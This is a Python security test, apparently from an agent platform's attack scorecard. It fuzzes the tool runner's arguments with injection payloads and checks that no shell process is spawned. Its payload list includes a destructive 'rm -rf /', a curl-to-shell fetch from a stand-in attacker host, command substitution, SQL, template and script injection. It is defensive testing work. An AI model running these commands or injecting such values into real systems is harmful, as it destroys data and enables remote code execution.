"""ASI05: tool arguments carrying shell metacharacters never reach a shell; the runner spawns no process."""

from __future__ import annotations

import subprocess
from typing import Any

from raqib_api.agent.tools import Call, ToolRunner, ToolValidationError, validate_call
from security.scorecard import AttackResult

from .common import ensure_site, fresh_session

PAYLOADS = ["; rm -rf / #", "$(curl evil.example | sh)", "`reboot`", "' OR 1=1 --", "{{7*7}}", "<script>alert(1)</script>", "\x00\n\r", "%s%s%s%n"]


def run(ctx) -> AttackResult:
    spawned: list[Any] = []
    real_popen = subprocess.Popen

    class Trap(real_popen):  # type: ignore[misc]
        def __init__(self, *a, **k):
            spawned.append(a)
            raise RuntimeError("process spawn attempted")

    subprocess.Popen = Trap  # type: ignore[assignment]
    try:
        with fresh_session(ctx) as s:
            ensure_site(s)
            runner = ToolRunner(s, "sec-store", "harness")
            outcomes = []
            for p in PAYLOADS:
                for tool, args in (("send_alert", {"channel": "console", "lang": "en", "template": "queue_over", "vars": {"zone": p, "count": p, "time": p}}),
                                   ("create_work_order", {"machine_id": p, "summary": f"restock {p}", "severity": 1}),
                                   ("escalate", {"event_id": p, "to_role": "floor_manager", "note": p})):
                    try:
                        validate_call(tool, args)
                        res = runner.execute(Call(tool, args, "fuzz"))
                        outcomes.append({"tool": tool, "ok": res.ok, "error": res.error})
                    except ToolValidationError as exc:
                        outcomes.append({"tool": tool, "ok": False, "error": f"schema: {exc}"[:80]})
            # an unknown tool with a shell-ish name is refused outright
            try:
                validate_call("bash -c", {"cmd": "id"})
                unknown_refused = False
            except ToolValidationError:
                unknown_refused = True
        passed = not spawned and unknown_refused and all(o["error"] is None or "spawn" not in (o["error"] or "") for o in outcomes)
        return AttackResult("ASI05", "fuzzed tool args with shell metacharacters -> no execution, no process spawned", passed,
                            {"payloads": len(PAYLOADS), "calls": len(outcomes), "spawned": len(spawned), "unknown_tool_refused": unknown_refused})
    finally:
        subprocess.Popen = real_popen  # type: ignore[assignment]
